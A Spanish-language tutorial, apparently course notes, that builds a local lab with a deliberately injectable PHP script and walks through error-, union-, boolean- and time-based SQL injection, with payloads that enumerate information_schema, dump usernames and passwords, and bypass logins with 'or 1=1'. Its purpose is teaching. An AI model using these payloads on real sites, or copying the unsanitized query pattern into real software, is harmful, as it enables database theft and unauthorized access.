-------
- Tags: #vulnerabilidades #sqlinjection #web
-------
# Definición de SQL y Query

> **SQL**, que significa "**Structured Query Language**" (Lenguaje de Consulta Estructurado), es un **lenguaje de computación estándar** diseñado para **gestionar** y manipular **bases de datos relacionales**. Este lenguaje sirve para comunicarse con una base de datos que existe en un ordenador, y es usado para realizar operaciones que se llaman de tipo **C.R.U.D**, que son operaciones que se encargan de **Create**, **Read**, **Update**, **Delete** datos y tablas de la base de datos.
> Las bases de datos siempre siguen una estructura, la cual se asigna en el siguiente orden **Base de datos**, **Tablas**, **Columnas**, **Datos**.

>**Query** es llamado a las **peticiones que se hacen a la base de datos** con la intención de **extraer** una parte o una vista de la **información que nos interese**, digamos que la base de datos siempre va a tener muchas tablas, por ende no vamos a poder verla todo de una sola vez, si no que vamos a querer extraer pedazos de ella para poder analizarla. Un ejemplo de una petición a la base de datos mediante el uso de una **Query** sería **order by 100**, que se utiliza para **enumerar la columna numero 100** dentro de la tabla de la base de datos. 
>
>Hay que saber que nosotros en la **web** estamos haciendo consultas **todo el tiempo**, por ejemplo cuando buscamos algo en **Google**, estamos haciendo una **consulta** o petición al **sistema de google**, pero **no lo hacemos en un lenguaje SQL**, si no que a través de la **caja de dialogo**, lo mismo pasa en **YouTube** y otras webs.

# Definición de SQL Injection

> **SQL Injection** es una **técnica de ataque** utilizada para explotar vulnerabilidades en **aplicaciones web** que no validan adecuadamente la **petición**/**entrada** o **Query** realizada, intentando corromper con el uso de **caracteres especiales** la misma para poder ejecutar consultas **SQL maliciosas** y tener acceso a **información confidencial de la base de datos** como **contraseñas**, **usuarios**, y información que **no debería ser vista**.
   Las **inyecciones SQL** se producen cuando los atacantes insertan **código SQL malicioso** en los **campos de entrada** de una **aplicación web**. Si la aplicación **no valida adecuadamente la entrada del usuario**, la consulta SQL maliciosa se **ejecutará en la base de datos**, lo que permitirá al atacante obtener información confidencial o incluso controlar la base de datos.

Hay varios tipos de **inyecciones SQL**, incluyendo:
- **Inyección SQL basada en errores**: Este tipo de inyección SQL aprovecha **errores en el código SQL** para obtener información. Por ejemplo, si una consulta devuelve un error con un mensaje específico, se puede utilizar ese mensaje para obtener información adicional del sistema.
- **Inyección SQL basada en uniones**: Este tipo de inyección SQL utiliza la cláusula “**UNION**” para combinar dos o más consultas en una sola. Por ejemplo, si se utiliza una consulta que devuelve información sobre los usuarios y se agrega una cláusula “**UNION**” con otra consulta que devuelve información sobre los permisos, se puede obtener información adicional sobre los permisos de los usuarios.
- **Inyección SQL basada en booleanos**: Este tipo de inyección SQL utiliza consultas con **expresiones booleanas** para obtener información adicional. Por ejemplo, se puede utilizar una consulta con una expresión booleana para determinar si un usuario existe en una base de datos.
- **Inyección SQL basada en tiempo**: Este tipo de inyección SQL utiliza una consulta que **tarda mucho tiempo en ejecutarse** para obtener información. Por ejemplo, si se utiliza una consulta que realiza una búsqueda en una tabla y se añade un retardo en la consulta, se puede utilizar ese retardo para obtener información adicional
- **Inyección SQL basada en stacked queries**: Este tipo de inyección SQL aprovecha la posibilidad de **ejecutar múltiples consultas** en una sola sentencia para obtener información adicional. Por ejemplo, se puede utilizar una consulta que inserta un registro en una tabla y luego agregar una consulta adicional que devuelve información sobre la tabla.

Cabe destacar que, además de las **técnicas** citadas anteriormente, **existen muchos otros tipos de inyecciones SQL**. Sin embargo, estas son algunas de las **más populares y comúnmente utilizadas** por los atacantes en **páginas web vulnerables**.

# Laboratorio para SQLI

## Instalación y manipulación de la Base de datos

Instalar **mariadb-server**, **apache2**, y **php-mysql**
```
apt install mariadb-server apache2 php-mysql
```

Ejecutaremos el servicio **mysql** que lo que hará es habilitar el **Puerto 3306** en nuestro equipo con el servicio **maridbd** corriendo, el **mysql**. Verificar con **lsof -i:3306**.
==(En caso de errores al usar el siguiente comando borrar todos los contenedores o específicamente el que esté corriendo por el puerto 3306 ya que se superponen causando conflicto)==
```
service mysql start
```

Ejecutaremos el servicio de **apache2** que corresponde al servicio **HTTP** que queremos que por el **Puerto 80** esté montado.
```
service apache2 start
```

Lo primero que vamos a hacer es **conectarnos con mysql** al **propio servicio** para poder listar las **bases de datos** y demás. ==Presionaremos ENTER cuando nos pida contraseña==
```
mysql -uroot -p
```

Una vez dentro disponemos de **comandos dentro del servicio** los cuales **siempre** acompañaremos de un **";"** al final para indicarle al sistema de gestión de base de datos que la instrucción termina ahí.

**help**: Muestra todos los comandos existentes.
**show databases**: Muestra la lista de bases de datos disponibles en el sistema.
**show tables**: Muestra la lista de tablas en una base de datos específica.
**show columns from table_name**: Muestra la información sobre las columnas de una tabla particular.

**use database-name**: Sirve para ingresar dentro de una base de datos.
**describe table-name**: Sirve para ver las columnas de una tabla especificada.

**select (asterisco*) from table-name**: Sirve para ver la información de todas las columnas. ==Se escribe solamente el símbolo del asterisco==
**select column-name1, column-name2 from table-name**: Sirve para ver la información de una o mas columnas en una tabla especificada.
**select column-name1, column-name2 from table-name where column-name = 'root'**: Para poder especificar aun mas la búsqueda, en este caso buscamos por el usuario root.

En este caso en nuestra base de datos **mariadb** en base a la información que hemos conseguido con los comandos anteriores, usaremos este ejemplo, donde estaremos indicando que queremos ver el contenido de la **columna user** y la **columna password** dentro de la **tabla user**, donde en la **tabla user** esté el usuario **root**. Si este usuario **no existiera**, nos lo indicaría o no nos daría respuesta, por ende con este método podemos **enumerar** que usuarios o contraseñas **existen** y que usuarios o contraseñas **no existen**.
```SQL
select user,password from user where user = 'root';`
```
## Creación de nuestra propia Base de datos

Dentro del servicio **mysql** utilizaremos el siguiente comando
```SQL
create database Hack4u; 
```

**Ingresamos** dentro de la base de datos **Hack4u** creada, y si listamos con **show tables** veremos que **no hay tablas**, por ende **vamos a crearlas** al mismo tiempo que **creamos las columnas**.
```SQL
create table users(id int(32), username varchar(32), password varchar(32));
```
- Estamos creando una **tabla** con nombre **users**, en la cual dentro tendrá varias columnas
- Una columna **id** con un valor de tipo **int** de **32 bits** 
- Una columna **username**, donde el **varchar** significa Variable Character o cadena de caracteres de hasta **32 caracteres de longitud**.
- Una columna **password**. donde el varchar posee una **cadena de caracteres** de hasta 32 caracteres de longitud.

Una vez hayamos creado la tabla **users**, con sus tres columnas **id**, **username** y **password**, vamos a introducirles datos a cada una de ellas.
```SQL
insert into users(id,username,password) value(1, 'admin', 'admin123$!p@$$');
```

```SQL
insert into users(id,username,password) value(2, 's4vitar', 's4vitarlammer123');
```

```SQL
insert into users(id,username,password) value (3, 'omar', 'omarelhacker1313');
```

Si nos llegáramos a equivocar y ponemos un ID que ya existe para otro usuario, podemos hacer los siguiente a modo de ejemplo
```SQL
update users set id=2 where username='s4vitar'  
```
En este caso asignamos el **id 2** al usuario **s4vitar** dentro de la **tabla users**.

Si listamos con el siguiente comando, veremos **TODO el contenido incluyendo columnas** dentro de la tabla **users**.
```SQL
select * from users; 
```

## Preparación y creación de script base en PHP

Para el script en **PHP** que vamos a crear, debemos hacer que el mismo **se pueda conectar a la base de datos**, para esto vamos a **crear un usuario especial** de la siguiente manera

```SQL
create user 's4vitar'@'localhost' identified by 's4vitar123';
```

Otorgaremos **privilegios** al usuario **s4vitar** con el siguiente comando, donde el .* representa a **todo el contenido** dentro de la **base de datos Hack4u**. 

```SQL
grant all privileges on Hack4u.* to 's4vitar'@'localhost';
```

Luego creamos un archivo llamado **searchUsers.php** dentro del directorio **/var/www/html/** para comenzar el desarrollo del script para la **base de datos**, en donde colocaremos al comienzo las **variables principales** que utilizaremos para **conectarnos a la misma**.

```PHP
<?php

  $server = "localhost";
  $username = "s4vitar";
  $password = "s4vitar123";
  $database = "Hack4u";
  
?>
```

Establecemos la conexión con la variable **$conn** 

```PHP
<?php

  $server = "localhost";
  $username = "s4vitar";
  $password = "s4vitar123";
  $database = "Hack4u";

  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);  
?>
```

Luego de hacer esto y guardar el progreso actual del script, verificamos con **service apache2 status** y con **service mysql status** si ambos servicios están activos, de ser así si nos dirigimos al navegador y colocamos **localhost** en el dominio, ingresaremos y veremos el archivo **.php**. 

Nuestro objetivo ahora es programar en el script, que cuando coloquemos en el dominio http://localhost/searchUsers.php (que es la ruta donde estaremos dentro del servidor si abrimos el archivo **.php**), la sintaxis **?id=1** al final quedando tal que así http://localhost/searchUsers.php?id=1 nos **liste el usuario** que posea el **identificador de usuario** con numero **"1"** que en nuestro caso, es el usuario **admin** que creamos anteriormente. 

Para hacer esto agregamos lo siguiente, ya que algo a tener en cuenta es que el parámetro **?id=1** que enviamos, al ser mediante el **URL** es una petición de tipo **GET**, sería de tipo **POST** si tuviésemos un formulario con un **botón de enviar** o algo típico.

```PHP
<?php

  $server = "localhost";
  $username = "s4vitar";
  $password = "s4vitar123";
  $database = "Hack4u";

  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);  

  $id = $_GET['id'];
?>
```

Lo que hacemos acá es decirle que la variable **id** va a valer lo que le metamos como valor al **parámetro id** que por **GET** estamos introduciendo en la **URL**.

Ahora lo que debemos hacer es indicar que dependiendo del numero de identificador de usuario que coloquemos, nos brinde el nombre del usuario correspondiente a ese identificador.
Para esto creamos una variable **data** que va a tramitar una **query** o petición a través de la **conexión establecida** por la variable **conn** para ubicar la columna **username** dentro de la tabla **users** donde el **id** sea igual al que **coloquemos dentro del parámetro id en la URL** para que nos muestre el **nombre del usuario** correspondiente a ese **identificador** en la web. 
Esto se consigue gracias a que el parámetro id estará buscando dentro de la base de datos una coincidencia frente al numero que coloquemos, si coincide con el id de un usuario, nos mostrara que usuario posee ese identificador.

```PHP
<?php

  $server = "localhost";
  $username = "s4vitar";
  $password = "s4vitar123";
  $database = "Hack4u";

  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);  

  $id = $_GET['id'];
  $data = mysqli_query($conn, "select username from users where id = '$id'");
?>
```

Para que la web nos represente de una vez los usuarios que coincidan con el identificador de usuario que coloquemos, tenemos que agregar una variable mas llamada **response**, que **representa la respuesta** frente a la **información** que contenga la variable **data** creada anteriormente. 
Luego añadimos una linea **echo** para poder **mostrar la variable response**, pero únicamente el campo **username**.

```PHP
<?php

  $server = "localhost";
  $username = "s4vitar";
  $password = "s4vitar123";
  $database = "Hack4u";

  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);  

  $id = $_GET['id'];

  // Definición de la query (SIN SANITIZAR) dependiendo del valor que coloquemos en el parametro ?id=
  $data = mysqli_query($conn, "select username from users where id = '$id'");

  // Respuesta frente al contenido de la variable $data
  $response = mysqli_fetch_array($data);

  echo $response['username'];
?>
```

Ya con esto que creamos hasta ahora **nos sirve para aplicar una SQL Injection**, ya que como leímos arriba, la **petición de la query no está sanitizada**.

---------
# Explotación SQLI

En la linea ``select username from users where id = '$id'`` dentro del script en donde dice ``'$id'`` es donde colocaríamos nuestro **input** pero desde la **URL** y como vemos está encerrado entre **comillas simples**. A causa de esto **podríamos aprovecharnos** y en vez de colocar **1** por ejemplo, podríamos colocar una **comilla simple** luego del numero tal que así **1'**, de esta manera estaríamos cerrando la query pero habría una comilla simple de más que **se quedaría colgando o sola**, lo que causaría que se acontezca un **error en la base de datos** haciendo que la query se corrompa **ENVIANDO O NO** dependiendo de como esté configurado, un **mensaje de error** en la web, **en este caso no nos dará ningún error**, simplemente **quedará en blanco**.
==Algo a tener en cuenta, es que nosotros todo esto lo estaríamos haciendo dentro del URL, por ende la sintaxis con la comilla de más quedaría tal que así: ==
``http://localhost/searchUsers.php?id=1'``
## SQLI basada en errores y uniones

Para hacer que la petición anterior nos brinde un error y utilizar una **SQL Injection basada en errores**, debemos agregarle **"or die (mysqli_error($conn))"** a la variable **data** o Query

```php
<?php

  $server = "localhost";
  $username = "s4vitar";
  $password = "s4vitar123";
  $database = "Hack4u";

  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);  

  $id = $_GET['id'];

  // Definición de la query (SIN SANITIZAR) dependiendo del valor que coloquemos en el parametro ?id= con error visible
  $data = mysqli_query($conn, "select username from users where id = '$id'") or die(mysqli_error($conn));

  // Respuesta frente al contenido de la variable $data
  $response = mysqli_fetch_array($data);

  echo $response['username'];
?>

# Si todo el script no nos deja ver el ERROR al usar la comilla podemos colocar esta linea al inicio del SCRIPT .php y borrar el "or die...". 
ini_set('display_errors', 1);
```

De esta forma nos aparecería el siguiente error luego de intentar ingresar a la URL ``http://localhost/searchUsers.php?id=1'``

![[SQLI comilla simple despues del 1.png]]

Si esto nos aparece luego de colocar una comilla simple en la sintaxis, significa que **el sistema es vulnerable a SQL Injection**.

Cuando nosotros **detectemos mediante un error que el servidor es vulnerable a Inyecciones SQL**, debemos comenzar a **tomar información** de la base de datos de manera **progresiva**, para comenzar a hacer esto vamos a realizar un **ordenamiento de datos basados en una columna que creamos que pueda ser inexistente**.
Nosotros lo haremos en la **100ava columna** comentando el final de la Query con "**-- -**"  de la siguiente manera.
==Siempre es importante tener en cuenta que al final debemos comentar el resto de la Query con "-- -"==

![[order by 100 SQLI.png]]

Al encontrar que **no existe la columna colocada**, debemos ir **bajando poco a poco el valor** hasta **averiguar cuantas existen**, básicamente estamos haciendo **FUZZING**.
En este caso nosotros sabemos que **existen tres columnas** ya que **las creamos nosotros previamente**, pero cuando en **order by 100**, coloquemos el valor **3** dentro de la URL, **no nos va a brindar que existen tres columnas**, ya que dentro del **script** de la base de datos, el parámetro **ID** está **asignado a una columna sola la cual es la columna ID**, por ende solo nos detectará si colocamos el valor **1**.

Luego de identificar la cantidad de columnas existentes eliminamos el **order by** y haremos uso de una **inyección basada en uniones** con **union select** para meterle una **nueva fila a la columna** donde incorporemos un **nuevo dato** con la misma cantidad de **columnas**. En este caso agregamos el dato **1** en el **union select** pero pueden ser cadenas de texto, comandos, etc.

------
Esto dentro del **servicio** de Mariadb MySQL se vería así

![[MARIADB UNION SELECT.png]]

--------

Es importante tener en cuenta que si **hubiera mas de una columna**, y colocamos el **numero erróneo**, el **union select** lanzará un **error** de la siguiente manera, **por no coincidir con el numero de columnas**.

![[MARIADB UNION SELECT NO COINCIDEN COLUMNAS.png]]

-------

En la siguiente imagen estamos **filtrando por dos columnas**, la **columna username**, y la **columna password**, por ende **deberíamos colocar en el union select** lo siguiente
Haciendo referencia con el **1** a la **primera columna** y con el **2** a la **segunda columna**, y de esta manera **sería sucesivamente si hubiera aun mas columnas** ==Siempre separado por ","==.

![[MARIADB UNION SELECT COINCIDEN 2 COLUMNAS.png]]

------

Hay que tener en cuenta que hay veces que esos **números** que nosotros agregamos a las columnas **aparecen en la web**, y ahi es donde **comienza la Inyección** como tal, ya que **en vez de colocar un valor numérico** como "1" o "2" podemos utilizar **comandos** para **obtener información de la base de datos**.

Recomendamos que en vez de colocar en la web un **identificador de usuario existente** (Que en nuestro caso poníamos **?id=3'**), coloquemos uno que **no exista**, para que **solo nos muestre la fila agregada por nosotros**, por ejemplo **?id=12345'** y en el union select **'prueba'** en vez de **1**.

![[UNION SELECT en URL.png]]

---------

Ahora es cuando **podemos aprovecharnos** y en vez de poner la cadena de texto "**'prueba'**" podemos colocar "**database()**" para que **nos liste el nombre de la base de datos actual, que es la que está en uso** que es **Hack4u**.
Nosotros sabemos que existe **mas de una base de datos**, por ende en vez de colocar **database()** podemos colocar **schema_name from information_schema.schemata** para listar **todas las bases de datos existentes**, pero **no siempre te las va a mostrar todas**, pero podemos jugar con limitadores con **limit 0,1** para indicar que **te limite el output a un único resultado** y si hubiera múltiples resultados o en este caso múltiples bases de datos, podríamos ir **enumerándolas de una en una** con **1,1** con **2,1** con **3,1**, etc.

![[SQLI enumerando base de datos con limit 0,1.png]]

Si pusiéramos **limit 1,1** nos mostraría la siguiente, si pusiéramos **2,1** la siguiente y así **sucesivamente**.

------------

Si quisiéramos que se nos listen **todas las bases de datos juntas** pero separadas por una coma, podríamos borrar **limit 0,1** para luego colocar un **group_concat** antes del **schema_name** y colocarle **( )** al segundo tal que así. Esto lo que hará será ==listar toda la información de una vez==, separada por comas para que sea mas entendible.

![[group_concat union select.png]]


--------

Una vez encontremos **todas las bases de datos existentes**, queremos **listar las tablas**, ya que recordemos que va por ese orden ==(BASE DE DATOS, TABLAS, COLUMNAS, DATOS)== y nosotros **queremos llegar a los datos**. 

Para realizar el listado de tablas debemos hacer lo siguiente 
- **Reemplazar** donde dice el **(schema_name)** que está entre y colocarle **(table_name)** 
- **Reemplazar** donde dice **information_schema.schemata** por **information_schema.tables** y agregamos **where table_schema = 'nombre-de-basededatos'**

Esta Query nos **brindará el nombre de las tablas existentes** para la **base de datos que le coloquemos**, en nuestro caso nos interesa la base de datos **Hack4u**

![[Listado de tablas con UNION SELECT.png]]

--------

Tras hacer todo esto solo nos resta ir reemplazando la información que vayamos consiguiendo hasta llegar a los datos.

Para realizar el listado de las columnas hacemos lo siguiente
- **Reemplazamos** donde dice **(table_name)** y colocamos **(column_name)**
- **Reemplazamos** donde dice **information_schema.tables** y colocamos **information_schema.columns**
- **Agregamos** luego del nombre de la base de datos **and table name='users'**

Esta Query nos **listará las columnas existentes** para la **base de datos Hack4u**, dentro de la **tabla users**.

![[Listado de columnas con UNION SELECT.png]]

--------

Una vez llegamos a conseguir los **nombres de las columnas existentes** dentro de la tabla que elegimos, **podemos listar sus contenidos**

Para poder ver los datos de cada columna podemos hacer lo siguiente
- **Reemplazamos** donde dice **(column_name)** por **(username)** que en nuestro caso es el nombre de una de las columnas que encontramos.
- **Reemplazamos** donde dice **from information_schema.columns where table_schema = 'Hack4u' and table_name='users'** por **from (nombre-de-basedatos).users** en este caso quedaría tal que así **from Hack4u.users**

Algo a tener en cuenta es que si estas **columnas que listamos**, están **dentro de la base de datos utilizada actualmente**, que en este caso es así **Hack4u** (que la identificamos al hacer **database()**) en vez de poner **from Hack4u.users** podemos poner **únicamente el nombre de la tabla** tal que así **from users**

![[Listado de datos de las columnas con UNION SELECT.png]]

Y de esta forma nos estaría listando los **usuarios existentes**, dentro de la **columna username** en la **tabla users** en la **base de datos Hack4u** que es la que está siendo usada actualmente. Pudiendo reemplazar **username** por **password** o la columna a la que queramos **verle los datos**.

Podemos hacer que nos de el **usuario**, seguido de su **contraseña** haciendo lo siguiente **union select group_concat(username,":",password)** pero los dos puntos **pueden generar conflicto**, por ende se recomienda colocarlos en hexadecimal, que se puede encontrar como se escribe en Linux con **man ascii**, luego de reemplazar los dos puntos quedaría tal que así 
**union select group_concat(username,0x3a,password) from users-- -**

![[Listado de datos usuario y contraseña con dos puntos UNION SELECT.png]]

----------
## SQLI sin errores

Hay veces en las que al **intentar identificar** si una web es vulnerable a SQL Injection **no podemos ver el error de la sintaxis al agregar una comilla en la web**, ya sea porque **el desarrollador no quiere** que se muestre, o simplemente como **medida de seguridad** o **sanitización**. Para cuando se de este caso, hay diferentes formas de llevar a cabo una identificación de la vulnerabilidad.

Lo primero que vamos a hacer es borrar del script lo agregado en SQLI errores para poder quitar los errores, por ende eliminamos el ``or die (mysqli_error ($conn))`` para luego verificar en la web que ya no salgan errores.

Lo segundo que debemos hacer luego de inyectar un id de usuario **existente** con la comilla simple y **no ver ningún error**, es **seguir con los pasos comúnmente**, utilizando **order by 100-- -** para ordenar las **columnas**, esto lo hacemos para intentar identificar la posible cantidad de **columnas existentes**, en nuestro caso **una sola** (==order by 1==), ya que en el script solo mostramos la columna **username**. Nos damos cuenta que en este caso existe una columna sola ya que al ir haciendo fuzzing con **?id=1' order by 100-- -**, **?id=1' order by 20-- -**, y demás vemos que no sale nada en la web, pero al colocar **?id=1' order by 1-- -** nos muestra el usuario "admin" correspondiente al ID numero 1, por lo tanto **existe 1 columna sola**.

Acá es donde definimos que **solo exista una columna**
![[SQLI PHP SIN ERRORES Y CON UNA COLUMNA.png]]

Si nosotros le agregamos en nuestro script php una columna extra además de la ya existente ``select username,password from users...``, ahora serán **dos columnas que se muestran** y **con** ==order by 2== nos dará información, entonces ya con esto sabríamos mediante FUZZING **que existen dos columnas**. 

Esto mismo se podría aplicar usando **union select 1,2** ya que son **dos columnas** las que hay, por ende asignamos el **1 a la primera columna** llamada username y el **2 a la segunda columna** llamada password. Si pusiéramos solamente **union select 1** esto **no coincidiría con el numero de columnas** y no nos mostraría información, tampoco veríamos el error de la no coincidencia de columnas **ya que no hay errores visibles**.
==RECORDEMOS QUE EL "1" Y EL "2" SON NUMEROS MERAMENTE PARA UBICAR DATOS EN LAS COLUMNAS, PODRIAMOS PONER TEXTO O OTROS DATOS==
==SI NO COLOCAMOS POR LO MENOS UN DATO CUALQUIERA EN CADA COLUMNA EXISTENTE EL UNION SELECT NO FUNCIONARÁ, SI IDENTIFICAMOS 15 COLUMNAS HAREMOS UN== **union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15** ==Y EN BASE A DONDE NOS QUEDE COMODO QUE QUEREMOS QUE LA WEB NOS REPRESENTE LA INYECCIÓN ELEGÍMOS CUALQUIERA DE ESAS 15 COLUMNAS==.

Una vez ubicada la cantidad de columnas existentes, en este caso **dos**, ya que recordemos que lo detectamos con **order by 2** y con **union select 1,2**, procedemos a cambiar el numero de identificador de usuario existente que habíamos colocado en **?id=** por uno que no exista, para comenzar a inyectar datos con **union select database(),2** por ejemplo, o cualquier otro tipo de **inyección** para poder ir recopilando datos de la base de datos.

------ 

Importante ==recordar== que cuando realizamos una inyección y hay mas de una columna, en este caso (1,2) debemos colocar el orden de las sintaxis tal que así

![[Mas de una columna con UNION SELECT.png]]

------

Normalmente cuando no tenemos los errores visibles, la forma de darnos cuenta que acertamos con el numero de columnas existente es que **la web cambie de alguna manera**, puede que haya algún **dato** que ya **no te muestre** o que **te muestre** o que la **longitud de la respuesta cambie**, o simplemente haya **mostrado algo que antes no aparecía**. Por lo tanto es una forma de determinar que es vulnerable a inyecciones SQL.

Otra manera de determinar que es vulnerable es utilizando **?id=1' and sleep (5)-- -** indicándole que te muestre el usuario con el identificador correspondiente al **1**, pero que a la vez **espere cinco segundos la web para responderte**.

----------
## SQLI con sanitización de caracteres especiales

Muchas veces los desarrolladores web hacen bien su trabajo y **sanitizan** los diferentes **métodos de entrada** que posee su web, en este caso entraremos al script para **crear una sanitización** mas sólida para poder jugar con un poco mas de dificultad. 

- Primero **agregaremos** un **echo** para poder identificar los **valores** que coloquemos, ya que con la sanitización que apliquemos mas adelante **nos interesa ver como será interpretada nuestra sintaxis por la web**. Además colocaremos otra vez una **única columna** para este ejemplo borrando la columna **password**
- Segundo **agregaremos** a la variable ``$id = $_GET['id'];`` lo siguiente ``$id = mysqli_real_escape_string ($conn, $_GET['id']);`` que lo que hará será **sanitizar** y cuando coloquemos una comilla simple en la web, esta la va a **escapar** al igual que otros caracteres especiales.


```PHP
<?php

  $server = "localhost";
  $username = "s4vitar";
  $password = "s4vitar123";
  $database = "Hack4u";

  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);  

  $id = mysqli_real_escape_string ($conn, $_GET['id']);
  echo "[+] Tu valor introducido es: " . $id . "<br>----------------------------------------------------------------------------------<br>";

  // Definición de la query (SIN SANITIZAR) dependiendo del valor que coloquemos en el parametro ?id= con error NO visible
  $data = mysqli_query($conn, "select username from users where id = '$id'");

  // Respuesta frente al contenido de la variable $data
  $response = mysqli_fetch_array($data);

  echo $response['username'];
?>
```

Esto desde la web quedaría tal que así

![[echo para ver como interpreta los datos la web.png]]

Cuando esta **sanitización** está aplicada ya **nos encontramos con muchas mas dificultades para poder inyectar**. Una alternativa que podríamos llegar a tener es que si el desarrollador web en el campo ``$data = mysqli_query($conn, "select username from users where id = '$id'");`` en donde pone ``...= '$id'");`` no estuvieran las comillas simples, porque se olvidó o simplemente no lo hizo tal que así ``...= $id");`` podríamos **realizar una inyección** pero **sin el uso de caracteres especiales o comillas simples**.

Si se nos diera este caso particular, podríamos **inyectar de manera directa sin el uso de comillas**, simplemente colocaríamos **?id=1 order by 2** o **?id=123 union select database()** sin si quiera utilizar el comentario con "**-- -**" ya que **no se están utilizando caracteres especiales que debamos comentar**.

--------
## SQLI Boolean-based blind

La **Boolean-based blind SQL Injection** se aplica cuando **no obtenemos ningún tipo de información** de la web a la hora de intentar inyectar.

Para esto modificaremos el archivo **.php** de la base de datos **comentando** ``echo "[+] Tu valor introducido es: "`` y **eliminando** el ultimo campo ``echo $response['username'];`` y **agregaremos** 

```PHP
if(!isset(response['username'])){
http_response_code(404);
} 
```

Para que cuando detecta que **NO hay información**, nos brinde un error **404 Not found**, quedando de la siguiente manera en conjunto.

```PHP
<?php

  $server = "localhost";
  $username = "s4vitar";
  $password = "s4vitar123";
  $database = "Hack4u";

  // Conexión a la base de datos
  $conn = new mysqli($server, $username, $password, $database);  

  $id = mysqli_real_escape_string ($conn, $_GET['id']);
  // echo "[+] Tu valor introducido es: " . $id . "<br>----------------------------------------------------------------------------------<br>";

  // Definición de la query (SIN SANITIZAR) dependiendo del valor que coloquemos en el parametro ?id= con error NO visible
  $data = mysqli_query($conn, "select username from users where id = '$id'");

  // Respuesta frente al contenido de la variable $data
  $response = mysqli_fetch_array($data);

  if(!isset($response['username'])){
  http_response_code(404);
  } 

?>
```

De esta forma tendríamos toda la **información oculta**, ya que **no es visible**, por lo tanto no veríamos **absolutamente nada** aun que coloquemos **datos correctos** o **datos incorrectos**. 

Pero por detrás siempre tenemos que tener en cuenta que el **código de estado** para un **dato incorrecto es 404** (Que lo definimos previamente en este caso), y para un **dato correcto es 200** por mas que **no veamos ninguno** de ellos a **simple vista**. 
Para poder **visualizar** estos códigos de estado podemos utilizar la shell con el comando **curl** para tramitar una petición aplicando **-s** (silent para no ver el verbose de curl), **-X GET** (para tramitar una petición con el método **GET**) con el **parámetro -I** (para ver las cabeceras en la respuesta) a la url http://localhost/searchUsers.php?id=1 tal que así

- **curl -s -X GET "http://localhost/searchUsers.php?id=1" -I**
Luego lo mismo pero con el ID **1234** tal que así para ver la diferencia
- **curl -s -X GET "http://localhost/searchUsers.php?id=1234" -I**

![[peticion GET code 404, code 200.png]]

De esta manera a pesar de **no ver nada por la web**, mediante el uso de la petición empleada con **curl** podemos detectar que valores son **correctos** y cuales **incorrectos**. 
Se podría realizar utilizando ==BurpSuite== también para ver la **respuesta del servidor** una vez enviamos una determinada **petición**.

Con toda esta información que conseguimos detectamos una vía potencial a **CIEGAS** de inyección. ==Mas adelante aplicando script en Python==

Dado que en este caso **no podemos ver la información a simple vista** y **tampoco podemos hacer uso de comillas** ya que están sanitizadas, aplicaremos una **Boolean-based blind SQL Injection**.

----------
Para comenzar iremos a la web [MySQLonline](https://extendsclass.com/mysql-online.html) para **crear una base de datos online** para ver y tomar unos ejemplos que nos servirán para entender mejor este tipo de inyección.
**Replicaremos la tabla, las columnas y datos** que hicimos en nuestro servidor local **dentro de la web MySQLonline**.

```MYSQL
create table users(id int(32), username varchar(32), password varchar(32));
insert into users(id,username,password) value(1, 'admin', 'admin123$!p@$$');
insert into users(id,username,password) value(2, 's4vitar', 's4vitarlammer123');
insert into users(id,username,password) value(3, 'omar', 'omarelhacker1313');
```

Luego le damos **Run**.

----------

Cuando vamos a **ciegas** (Sin información visible y sin errores), lo que se puede hacer es **jugar con el tiempo**, o **jugar con condiciones**. En este caso comenzaremos con una **SQLI Condicional**.
Lo primero que haremos será **borrar todo** lo que escribimos en la **WEB** y luego **escribir** ``select username from users where id = 1;`` para después darle a **RUN**. Esto nos brindará el usuario **admin** ya que el **identificador de usuario** que le corresponde es el **1**.

Intentaremos **quedarnos con el primer carácter** de la palabra '**admin**' la letra '**a**', para esto utilizaremos la siguiente sintaxis.

- **select substring(username,1,1) from users where id = 1**

En donde el **',1,1'** representa que **nos muestre entre el primer carácter(1) y el primer carácter(1)**, por lo tanto **solo nos mostrara el carácter 'a'**.

Ahora si realizamos un select de todo lo anterior tal que así

- **select(select substring(username,1,1) from users where id = 1)** 

También **nos devolverá solo la letra 'a'**, pero lo bueno de ponerlo entre paréntesis de esta manera es que podemos hacer que **toda esa sintaxis sea igual a 'a'**

- **select(select substring(username,1,1) from users where id = 1)='a'**

Por lo tanto en este caso estaríamos diciendo que **a=a**, y esto nos devolverá un estado **booleano** que nos dirá **TRUE** o **FALSE**. 
Si a la sintaxis anterior le damos a **RUN** veremos que nos da '**1**' porque coincide que el primer carácter del usuario **admin** que es '**a**'. ==Cuando nos da 1 significa TRUE, cuando da 0 significa FALSE==

El problema acá es que **no podemos utilizar comillas ni caracteres especiales** por la sanitización que hicimos previamente, por lo tanto lo que podemos hacer **representar el primer carácter en decimal** de la siguiente manera **utilizando ascii**.

- **select(select ascii(substring(username,1,1)) from users where id = 1)**

Esto nos dará como resultado el **numero 97** que representa a la letra '**a**' en decimal. Por lo tanto aplicamos lo mismo **igualando** toda esa cadena a **97** tal que así.

- **select(select ascii(substring(username,1,1)) from users where id = 1)=97**

Y ya con esto recibiríamos un **TRUE** con el valor **1** ya que coinciden, de esta forma habremos **evitado el uso de caracteres especiales** para burlar la **sanitización**.

----------

Dentro de la shell utilizaremos la siguiente sentencia 

- **curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9"**

Esto **nos dará el mismo resultado que todo el URL junto que usamos anteriormente** ya que estamos utilizando -G para tramitar los datos por GET pero de forma separada, pero se hace para poder trabajar mas cómodos con el **uso de espacios dentro del parámetro 'id=1'**, por que de lo contrario, si estuviera todo el URL junto deberíamos **URLENCODEAR** los espacios.

Ahora lo que podemos hacer es colocar una **condición** tal como "**or 1=1**" 
==Esta condición se suele usar en paneles de autenticación mal montados, en donde colocando una Query incorrecta tal como "pepito" como usuario y agregamos lo siguiente "pepito or 1=1" podemos llegar a burlar el panel de autenticación y lograr ingresar saltándonos el panel de autenticación==

